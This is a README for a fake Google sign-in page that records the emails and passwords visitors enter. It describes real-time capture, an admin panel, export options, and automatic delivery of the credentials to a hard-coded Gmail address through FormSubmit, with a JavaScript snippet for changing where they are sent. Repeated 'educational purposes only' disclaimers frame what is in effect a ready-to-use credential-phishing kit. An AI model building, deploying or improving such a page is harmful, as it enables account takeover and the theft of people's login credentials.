# Google Sign-In Capture

A professional recreation of the Google sign-in flow for educational and demonstration purposes, featuring real-time login data capture and instant email notifications.

## 📋 Features

- **Authentic UI**: Pixel-perfect recreation of Google's dark mode sign-in experience
- **Real-time Capture**: Instantly captures login credentials as they're entered
- **Multi-delivery Options**: Choose from multiple ways to receive captured data
- **Responsive Design**: Works seamlessly on desktop, tablet, and mobile devices
- **Zero Server Requirements**: Works entirely client-side with no backend needed

## 🚀 Quick Start

1. Download or clone the repository
2. Open `index.html` in your browser
3. Test the login flow by entering an email and password
4. View captured data in the admin panel by clicking the "[Admin]" link at the bottom

## 📱 Login Flow

### Email Screen
Users first encounter the email input screen, which closely resembles Google's actual sign-in page.

### Password Screen
After entering an email, users are prompted for their password.

### Success Screen
Once login details are submitted, users see a success confirmation.

## 📬 Notification Methods

### 1. Email Notifications

Login credentials are automatically sent to your email in real-time, without requiring an admin panel visit.

#### Configuration:
The system is pre-configured to send emails to `mursalhayat00@gmail.com` using FormSubmit. To change this:

1. Edit the `sendLoginToEmail()` function in `google-password.html`
2. Update the email address in the `replyTo` field
3. If using a different email, you'll need to obtain a new FormSubmit activation code

### 2. Admin Panel

A comprehensive admin panel lets you view all captured logins in one place.
Access the admin panel by clicking the "[Admin]" link at the bottom of the index page.

### 3. Data Export Options

Multiple ways to export captured data:

- **Export as Text**: Download a text file with all login details
- **Direct Email**: Open your email client with pre-filled login data
- **FormSubmit**: Send data directly to your email via FormSubmit
- **Copy to Clipboard**: Copy login data to paste anywhere

## 🔧 Customization

### Changing Target Email

To change where login notifications are sent:

```javascript
// In google-password.html, find this line:
replyTo.value = 'mursalhayat00@gmail.com';

// Change to your email:
replyTo.value = 'your-email@example.com';
```

### Modifying UI Elements

The interface uses standard HTML/CSS and can be easily customized:

- Edit CSS in the `<style>` sections of each HTML file
- Modify text content in the HTML
- Adjust colors, spacing, and other visual elements as needed

## 📱 Mobile Responsiveness

The interface automatically adapts to different screen sizes.

## ⚙️ Technical Details

- **Pure Frontend**: Built with HTML, CSS, and vanilla JavaScript
- **No Dependencies**: Zero external libraries or frameworks
- **Local Storage**: Option to store captured data locally between sessions
- **Cross-Browser Compatible**: Works on all modern browsers

## 📝 Implementation Notes

For educational purposes, this project demonstrates:

1. Form handling and validation
2. Client-side data storage mechanisms
3. FormSubmit integration for serverless email delivery
4. Responsive design techniques
5. Modern CSS styling approaches

## 🔒 Security Considerations

This project is designed for educational purposes only. Using it to capture actual user credentials without explicit consent is illegal and unethical.

---

## 📬 Contact

For questions or support, please reach out to:
- Email: mursalhayat00@gmail.com

---

**Note:** This project is for educational purposes only. Do not use for any malicious activities or to collect actual user credentials without explicit consent. 